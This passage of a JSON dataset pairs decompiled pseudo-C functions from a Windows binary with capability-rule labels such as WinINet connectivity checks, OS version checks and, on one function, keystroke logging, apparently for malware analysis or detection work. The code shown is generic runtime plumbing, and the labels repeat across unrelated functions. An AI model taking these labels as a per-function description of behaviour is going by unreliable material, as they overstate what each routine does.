0x40dbde;\n    fcn.004045c8();\n    var_3ch = &fcn.0040da1c::var_38h;\n    var_40h = 0x40dbf3;\n    fcn.0040c0e0(var_3ch);\n    var_40h = 0x40dbfd;\n    iVar1 = fcn.00408da0();\n    if (iVar1 == 0) {\n        var_40h = 0x40dc0e;\n        fcn.00404660();\n    }\n    else {\n        var_40h = 0x40dc1d;\n        fcn.00404660();\n    }\n    var_40h = &fcn.0040da1c::var_3ch;\n    fcn.0040c0e0(var_40h);\n    iVar1 = fcn.00408da0();\n    if (iVar1 == 0) {\n        fcn.0040c0e0(&fcn.0040da1c::var_40h);\n        iVar1 = fcn.00408da0();\n        if (iVar1 == 0) {\n            fcn.00404660();\n        }\n        else {\n            fcn.00404660();\n        }\n    }\n    fcn.00404948(var_ch, 0x40dd80, var_4h, var_8h);\n    fcn.00404948(var_ch, 0x40dd8c, var_4h, var_8h);\n    *0x485752 = fcn.0040c12c();\n    *in_FS_OFFSET = var_ch;\n    fcn.004045ec(0x40dcee);\n    return;\n}\n",
        "token_count": 1698
    },
    "0040df7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040df7c(void)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint *puStack12;\n    \n    uVar1 = CONCAT31(unaff_EBX >> 8, 1);\n    for (puStack12 = *0x483310; (uVar1 != '\\0' && (puStack12 != NULL)); puStack12 = *puStack12) {\n        uVar1 = (*puStack12[1])();\n    }\n    return CONCAT44(puStack12, uVar1);\n}\n",
        "token_count": 120
    },
    "0040dfa8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040dfa8(void)\n\n{\n    while( true ) {\n        if (*0x483310 == NULL) break;\n        *0x483310 = **0x483310;\n        fcn.00402b44();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "0040e014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040e014(void)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffffdc;\n    int32_t **ppiStack32;\n    uint uVar4;\n    \n    if (**0x484458 == 0) {\n        uVar4 = 0;\n        piVar1 = **0x484760;\n        ppiVar2 = piVar1;\n        while (ppiVar2 != NULL) {\n            iVar3 = piVar1[1];\n            ppiStack32 = sub.kernel32.dll_FindResourceA(iVar3, 0x40e0a0, 10, uVar4);\n            in_stack_ffffffdc = sub.kernel32.dll_LoadResource(iVar3);\n            if (in_stack_ffffffdc != 0) break;\n            ppiStack32 = *ppiStack32;\n            ppiVar2 = ppiStack32;\n        }\n    }\n    else {\n        ppiStack32 = sub.kernel32.dll_FindResourceA(**0x484458, 0x40e0a0, 10);\n        in_stack_ffffffdc = sub.kernel32.dll_LoadResource(**0x484458);\n    }\n    return CONCAT44(ppiStack32, in_stack_ffffffdc);\n}\n",
        "token_count": 287
    },
    "0040e0a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040e0a8(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar2 = fcn.0040e014();\n    iVar3 = *0x483320;\n    if (iVar2 != 0) {\n        iVar3 = fcn.0040dfd4();\n        iVar4 = fcn.0040dfe4();\n        if ((((iVar3 == *0x483314) && (iVar4 == *0x483324)) || ((iVar3 == *0x483318 && (iVar4 == *0x483328)))) ||\n           ((iVar3 == *0x48331c && (iVar4 == *0x48332c)))) {\n            bVar1 = true;\n        }\n        else {\n            bVar1 = false;\n        }\n        sub.kernel32.dll_FreeResource(iVar2);\n        if (!bVar1) {\n            fcn.0040dffc();\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 229
    },
    "0040e15c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e15c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40e194);\n    if (iVar1 != 0) {\n        *0x483134 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40e1a4);\n    }\n    if (*0x483134 == NULL) {\n        *0x483134 = fcn.0040920c;\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0040e264": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e264(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puStack20;\n    \n    uVar1 = fcn.0040e24c();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puStack20 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puStack20 != NULL && (iVar2 != puStack20[1]));\n        puStack20 = *puStack20) {\n    }\n    if (puStack20 == NULL) {\n        puStack20 = fcn.0040e308();\n        if (puStack20 == NULL) {\n            puStack20 = fcn.0040881c();\n            puStack20[1] = iVar2;\n            puStack20[2] = 0x7fffffff;\n            *puStack20 = puStack20;\n            uVar3 = fcn.0040e1d0();\n            *puStack20 = uVar3;\n        }\n    }\n    *param_2 = puStack20;\n    return;\n}\n",
        "token_count": 270
    },
    "0040e308": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e308(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    \n    uVar1 = fcn.0040e24c(param_1);\n    puVar4 = *(in_EAX + 4 + (uVar1 & 0xff) * 4);\n    do {\n        if (puVar4 == NULL) {\ncode_r0x0040e356:\n            return CONCAT44(puVar4, puVar4);\n        }\n        iVar2 = fcn.0040e1d0();\n        if (iVar2 != 0x7fffffff) {\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n            puVar4[1] = uVar3;\n            goto code_r0x0040e356;\n        }\n        puVar4 = *puVar4;\n    } while( true );\n}\n",
        "token_count": 218
    },
    "0040ebd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040ebd0(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x40ec38;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x485794 == 0;\n    *0x485794 = *0x485794 + -1;\n    if (bVar1) {\n        fcn.00404350();\n        fcn.00404378();\n        if (*0x485665 != '\\0') {\n            fcn.0040461c();\n        }\n        fcn.0040cfe8();\n        fcn.0040d0ec();\n        fcn.0040e15c();\n        fcn.0040da1c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 223
    },
    "0040eee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040eee8(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.0040eee8::var_1h + 1;\n    uStack24 = 0x40ef55;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.00404850();\n        fcn.00408ec4();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40ef5c;\n    uStack24 = 0x40ef54;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 257
    },
    "0040f048": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f048(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x40f0ac;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00408f60();\n        fcn.00404e20();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40f0b3;\n    uStack20 = 0x40f0ab;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 223
    },
    "0040f0fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f0fc(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        var_4h = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (var_4h == 0) {\n            var_4h = in_EDX;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 124
    },
    "00410568": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410568(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_320h;\n    uint ppvData;\n    uint16_t *psa;\n    int32_t var_314h;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.00410110();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.00410110();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00410110();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        var_314h = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (var_314h == 0) {\n            fcn.0040fe68();\n        }\n        fcn.004104c0();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = var_314h;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.004104dc(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.00410110();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(var_314h, &rgIndices, &var_320h);\n                fcn.00410110();\n                (*var_308h)();\n            }\n            cVar1 = fcn.0041050c(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.00410110();\n    }\n    return;\n}\n",
        "token_count": 826
    },
    "00410d48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410d48(uint32_t param_1, uint16_t *param_2)\n\n{\n    float10 fVar1;\n    ulong uVar2;\n    \n    if (param_1 != *param_2) {\n        if (*param_2 == 0x400c) {\n            fcn.00410d48();\n        }\n        else {\n    // switch table (21 cases) at 0x410d8d\n            switch(param_1) {\n            case 0:\n                if ((*param_2 == 1) && (*0x48344c != '\\0')) {\n                    fcn.0040fc88();\n                }\n                else {\n                    fcn.004104c0();\n                }\n                break;\n            case 1:\n                fcn.00410228();\n                break;\n            case 2:\n                fcn.004116b4();\n                fcn.004149ac();\n                break;\n            case 3:\n                fcn.0041110c();\n                fcn.0041490c();\n                break;\n            case 4:\n                fVar1 = fcn.00412a78();\n                fcn.004149f8(fVar1);\n                break;\n            case 5:\n                fVar1 = fcn.004126e0();\n                fcn.00414a1c(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 6:\n                fVar1 = fcn.004133b8();\n                fcn.00414a48(ROUND(fVar1), ROUND(fVar1) >> 0x20);\n                break;\n            case 7:\n                fVar1 = fcn.00412e50();\n                fcn.00414a74(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 8:\n                fcn.00410b2c();\n                break;\n            case 9:\n                fcn.00410bc4();\n                break;\n            default:\n                if (param_1 == 0x100) {\n                    fcn.00410b78();\n                }\n                else if (param_1 == 0x101) {\n                    fcn.0040fc88();\n                }\n                else {\n                    fcn.00410cdc();\n                }\n                break;\n            case 0xb:\n                fcn.004121cc();\n                fcn.00414aa0();\n                break;\n            case 0xd:\n                fcn.00410c10();\n                break;\n            case 0x10:\n                fcn.0041155c();\n                fcn.0041498c();\n                break;\n            case 0x11:\n                fcn.0041160c();\n                fcn.0041492c();\n                break;\n            case 0x12:\n                fcn.004117ac();\n                fcn.0041494c();\n                break;\n            case 0x13:\n                fcn.00411884();\n                fcn.0041496c();\n                break;\n            case 0x14:\n                uVar2 = fcn.00411bd0();\n                fcn.004149cc(uVar2, uVar2 >> 0x20);\n            }\n        }\n        return;\n    }\n    fcn.004107fc();\n    return;\n}\n",
        "token_count": 722
    },
    "0041110c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041110c(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41152d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x41113f\n    switch(uVar1) {\n    case 0:\n        var_8h = 0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            puStack28 = &stack0xfffffffc;\n            fcn.0040fc88();\n        }\n        var_8h = 0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.0040375c();\n        }\n        break;\n    case 5:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.0040375c();\n        }\n        break;\n    case 6:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.0040375c();\n        }\n        break;\n    case 7:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.0040375c();\n        }\n        break;\n    case 8:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00410f74();\n        break;\n    case 9:\n    case 0xd:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411028();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00410f74();\n        }\n        else if (uVar1 == 0x101) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411064();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack28 = &stack0xfffffffc;\n            cVar2 = fcn.004110c8();\n            if (cVar2 == '\\0') {\n                var_8h = fcn.00411028();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x411363\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411028();\n                break;\n            case 2:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 3:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.0040375c();\n                }\n                break;\n            case 5:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.0040375c();\n                }\n                break;\n            case 6:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.0040375c();\n                }\n                break;\n            case 7:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.0040375c();\n                }\n                break;\n            case 8:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00410f74();\n                break;\n            case 0xb:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.0041110c();\n                break;\n            case 0x10:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x11:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x12:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x13:\n                var_8h = **(in_EAX + 4);\n                if (var_8h < 0) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.0040375c();\n                }\n                break;\n            case 0x14:\n                var_8h = **(in_EAX + 4);\n                if (var_8h >> 0x1f != (*(in_EAX + 4))[1]) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.0040375c();\n                }\n            }\n        }\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0xc:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.0041110c();\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        if (var_8h < 0) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.0040375c();\n        }\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n        if (var_8h >> 0x1f != *(in_EAX + 6)) {\n            var_8h = fcn.0040375c();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    return var_8h;\n}\n",
        "token_count": 1840
    },
    "0041155c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041155c(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x48344c != '\\0') {\n            puStack24 = 0x41159c;\n            fcn.0040fc88();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = in_EAX & 0xffffff00 | *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x10) {\n        uVar2 = in_EAX & 0xffffff00 | *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x4115e8;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.0041110c();\n        if (0xff < uVar2 + 0x80) {\n            fcn.0040375c();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 340
    },
    "0041160c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041160c(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x48344c != '\\0') {\n            puStack24 = 0x41164c;\n            fcn.0040fc88();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = in_EAX & 0xffffff00 | *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x11) {\n        uVar2 = in_EAX & 0xffffff00 | *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x41168f;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.0041110c();\n        if (0xff < uVar2) {\n            fcn.0040375c();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 334
    },
    "004116b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004116b4(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (7 cases) at 0x4116ec\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            puStack24 = 0x411725;\n            fcn.0040fc88();\n        }\n        uVar1 = 0;\n        break;\n    case 2:\n        uVar1 = in_EAX & 0xffff0000 | in_EAX[4];\n        break;\n    default:\n        uStack28 = 0x411788;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.0041110c();\n        if (0xffff < uVar1 + 0x8000) {\n            fcn.0040375c();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX & 0xffff0000 | in_EAX[4];\n        break;\n    case 0x10:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 367
    },
    "004117ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004117ac(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (6 cases) at 0x4117e1\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            puStack24 = 0x411813;\n            fcn.0040fc88();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x411861;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.0041110c();\n        if (0xffff < uVar1) {\n            fcn.0040375c();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX & 0xffff0000 | in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX & 0xffff0000 | in_EAX[4];\n    }\n    return uVar1;\n}\n",
        "token_count": 340
    },
    "00411884": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00411884(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (7 cases) at 0x4118be\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            puStack24 = 0x4118f7;\n            fcn.0040fc88();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x411949;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00411bd0();\n        uVar1 = uVar2;\n        if (uVar2 >> 0x20 != 0) {\n            uVar1 = fcn.0040375c();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar1 = *(in_EAX + 